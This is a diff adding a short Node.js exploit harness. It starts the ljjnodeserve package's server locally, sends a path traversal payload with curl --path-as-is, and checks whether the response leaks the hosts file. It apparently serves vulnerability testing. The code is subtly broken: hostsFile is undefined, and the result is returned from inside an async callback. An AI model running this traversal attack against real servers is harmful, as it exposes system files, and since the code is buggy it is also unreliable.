@@ -1,0 +1,25 @@
+function exploitFunction(payload) {
+  const { exec } = require("child_process");
+  const sleep = require("sleep");
+
+  // Start the server
+  let server = "node ./node_modules/ljjnodeserve/index.js ";
+  let exe = exec(server, (error, stdout) => {});
+
+  // Sleep for 2 seconds to ensure the server starts
+  sleep.sleep(2);
+
+  // Craft the attack string with the payload
+  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8888${payload}"`;
+
+  // Execute the attack string
+  exec(attack_string, (error, stdout) => {
+    let out = false;
+    if (stdout.includes(hostsFile)) {
+      out = true;
+    }
+    return out; // Return the result for verification
+  });
+}
+
+module.exports = { exploitFunction };
